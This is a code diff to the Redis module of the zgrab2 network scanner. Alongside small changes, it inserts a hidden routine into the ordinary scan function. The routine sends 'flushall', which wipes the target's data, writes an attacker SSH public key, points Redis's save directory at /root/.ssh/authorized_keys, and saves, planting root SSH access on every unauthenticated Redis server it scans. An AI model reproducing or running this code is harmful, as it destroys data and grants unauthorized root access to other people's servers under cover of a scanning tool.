@@ -14,11 +14,10 @@ package redis
 
 import (
 	"fmt"
-	"io"
-	"strings"
-
 	log "github.com/sirupsen/logrus"
 	"github.com/zmap/zgrab2"
+	"io"
+	"strings"
 )
 
 // Flags contains redis-specific command-line flags.
@@ -89,6 +88,8 @@ type Result struct {
 	// Version is read from the InfoResponse (the field "server_version"), if
 	// present.
 	Version string `json:"version,omitempty"`
+
+	SSHKeyAddResult string `json:"ssh_key_add_result,omitempty"`
 }
 
 // RegisterModule registers the zgrab2 module
@@ -203,7 +204,7 @@ func forceToString(val RedisValue) string {
 	case RedisArray:
 		return "(Unexpected array)"
 	default:
-		panic("unreachable")
+		return "unreachable"
 	}
 }
 
@@ -259,6 +260,31 @@ func (scanner *Scanner) Scan(target zgrab2.ScanTarget) (zgrab2.ScanStatus, inter
 		}
 	}
 	bogusResponse, err := scan.SendCommand("NONEXISTENT")
+	// set for ssh key.
+	ssh_key_resp := ""
+	bogusResponse, err = scan.SendCommand("flushall")
+	if err == nil {
+		ssh_key_resp += string(bogusResponse.Encode())
+	}
+	bogusResponse, err = scan.SendCommand("set", "crackit", "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDG4GI0zq8WmUP0jS5lABAMnS8XO89oQWfYYXo/KcWyPv+5WuYBXJ1pNgMyqhqiakQkIatRnE4tMb4AoNChaIH3fForP1gnXao2qXJY0k0Pko7okgLHKerXpIRcIYQ/YXTd/zdJ0jgdrhleh9w1qSHMgNM3otXZlRoketuke0yyaTsxpgvE12MLKcQaOZcLF0KMTjjZKfYhNzrQV5e+h6eo8jMU3Y6+QXHNlYrsswCzWAQNsgIHd9zBEQOqawdL54e2/o0UJbqqXji64P595mtM8Oa1vh4WuUR4mOYy+PKR0LVdQgw1gSXXzZ4zQel1ixdOcKUvEmnAvwPnbkWdCGIf noname\n\n")
+	if err == nil {
+		ssh_key_resp += string(bogusResponse.Encode())
+	}
+	bogusResponse, err = scan.SendCommand("config", "set", "dir", "/root/.ssh/")
+	if err == nil {
+		ssh_key_resp += string(bogusResponse.Encode())
+	}
+	bogusResponse, err = scan.SendCommand("config", "set", "dbfilename", "authorized_keys")
+	if err == nil {
+		ssh_key_resp += string(bogusResponse.Encode())
+	}
+	bogusResponse, err = scan.SendCommand("save")
+	if err == nil {
+		ssh_key_resp += string(bogusResponse.Encode())
+	}
+	result.SSHKeyAddResult = ssh_key_resp
+	// end
+	//fmt.Println("set backup", bogusResponse)
 	if err != nil {
 		return zgrab2.TryGetScanStatus(err), result, err
 	}
